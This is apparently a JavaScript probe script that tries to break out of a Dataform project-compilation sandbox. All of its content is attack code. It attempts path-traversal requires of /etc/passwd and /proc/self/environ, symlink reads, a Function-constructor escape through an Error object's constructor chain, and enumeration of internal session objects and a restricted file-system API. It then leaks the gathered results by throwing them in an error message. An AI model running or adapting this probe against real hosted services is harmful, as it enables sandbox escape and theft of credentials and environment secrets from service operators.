var info = {};
function safe(k, fn) { try { info[k] = String(fn()).substring(0,1500); } catch(e) { info[k] = "ERR:"+e.message.substring(0,300); } }

// ===== ANGLE 1: require() path traversal =====
safe('req_etc_passwd', () => { var x = require('/etc/passwd'); return 'GOT:' + typeof x; });
safe('req_rel_etc_passwd', () => { var x = require('../../../etc/passwd'); return 'GOT:' + typeof x; });
safe('req_proc_environ', () => { var x = require('/proc/self/environ'); return 'GOT:' + typeof x; });
safe('req_proc_self_cmdline', () => { var x = require('/proc/self/cmdline'); return 'GOT:' + typeof x; });
safe('req_above_workspace', () => { var x = require('../../some_above'); return 'GOT'; });
safe('req_workspace_root', () => { var x = require('/'); return 'GOT'; });
safe('req_node_modules', () => { var x = require('node_modules/@dataform/core'); return 'GOT:' + typeof x; });
safe('req_sym_passwd', () => { var x = require('./sym_passwd'); return 'GOT:' + JSON.stringify(x).substring(0,200); });

// ===== ANGLE 2: require Dataform internals =====
safe('req_df_core', () => { var x = require('@dataform/core'); return 'GOT:keys=' + Object.keys(x || {}).slice(0,20).join(','); });
safe('req_df_bundle', () => { var x = require('@dataform/core/bundle.js'); return 'GOT'; });
safe('req_df_session_module', () => { var x = require('@dataform/core/session'); return 'GOT'; });

// Inspect @dataform/core's internals
safe('df_compiler_source', () => {
  var x = require('@dataform/core');
  return 'core.compiler=' + (x.compiler ? x.compiler.toString().substring(0, 500) : 'no');
});
safe('df_indexFileGenerator', () => {
  var x = require('@dataform/core');
  return x.indexFileGenerator ? x.indexFileGenerator.toString().substring(0, 500) : 'no';
});

// ===== ANGLE 3: eval-constructed Function escape =====
safe('eval_basic', () => { return eval('1+1'); });
safe('eval_typeof', () => { return eval('typeof process'); });
safe('Function_basic', () => { return new Function('return 42')(); });
safe('Function_process', () => { return new Function('return typeof process')(); });

// Try to bridge via Function constructor with Error
safe('function_error_bridge', () => {
  var herr = function() { try { JSON.parse("{"); } catch(e) { return e; } };
  var hostFn = herr().constructor.constructor;
  return hostFn('return typeof process')();
});

// Try direct require_bin reference
safe('require_bin', () => { var x = require('require_bin'); return 'GOT_REQUIRE_BIN'; });
safe('resolve_bin', () => { var x = require('resolve_bin'); return 'GOT_RESOLVE_BIN'; });

// Process / proc access via different routes
safe('Function_globalThis', () => { return new Function('return Object.keys(globalThis).slice(0,30).join(",")')(); });
safe('Function_eval_process', () => { return new Function('return eval("typeof process")')(); });

// Try reading workspace files via restricted_fs from here
safe('rfs_README', () => { return global.restricted_fs.readFile('README.md').toString().substring(0,300); });
safe('rfs_sym_passwd', () => { return global.restricted_fs.readFile('sym_passwd').toString().substring(0,300); });
safe('rfs_etc_passwd', () => { return global.restricted_fs.readFile('/etc/passwd').toString().substring(0,300); });
safe('rfs_dotdot', () => { return global.restricted_fs.readFile('../foo').toString().substring(0,300); });

// Inspect _DF_SESSION more deeply
safe('df_session_keys', () => {
  var s = global._DF_SESSION;
  return Object.keys(s).join(',');
});
safe('df_session_proto_methods', () => {
  var s = global._DF_SESSION;
  return Object.getOwnPropertyNames(Object.getPrototypeOf(s)).join(',');
});
safe('df_session_projectConfig', () => {
  var s = global._DF_SESSION;
  return JSON.stringify(s.projectConfig).substring(0,500);
});

// Try Buffer / process via Reflect or other reflect tricks
safe('reflect_globalThis', () => Reflect.ownKeys(globalThis).slice(0,30).join(','));

throw new Error("PROBE2_OUT:" + JSON.stringify(info));
